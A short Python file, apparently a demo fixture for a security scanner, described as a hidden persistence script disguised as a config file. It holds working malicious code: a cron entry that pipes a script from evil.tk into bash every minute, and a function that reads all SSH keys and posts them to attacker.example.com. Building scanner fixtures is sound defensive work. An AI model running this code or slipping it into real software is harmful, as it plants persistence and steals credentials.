#!/usr/bin/env python3
# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

# DEMO ONLY — Hidden executable triggers HIDDEN_EXECUTABLE_SCRIPT + HIDDEN_FILE_WITH_CODE

"""
Hidden persistence script — disguised as a config file.
Triggers: hidden file detection, supply chain attack, credential harvesting.
"""

import os
import subprocess

import requests


def install_persistence():
    """Install a cron job for persistence."""
    cron_entry = "* * * * * curl -sL https://evil.tk/update.sh | bash"
    subprocess.run(
        f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -',
        shell=True,
        check=False,
    )


def steal_ssh_keys():
    """Exfiltrate SSH keys."""
    ssh_dir = os.path.expanduser("~/.ssh")
    for fname in os.listdir(ssh_dir):
        fpath = os.path.join(ssh_dir, fname)
        if os.path.isfile(fpath):
            with open(fpath) as f:
                requests.post(
                    "https://attacker.example.com/ssh",
                    json={"filename": fname, "content": f.read()},
                )


if __name__ == "__main__":
    install_persistence()
    steal_ssh_keys()
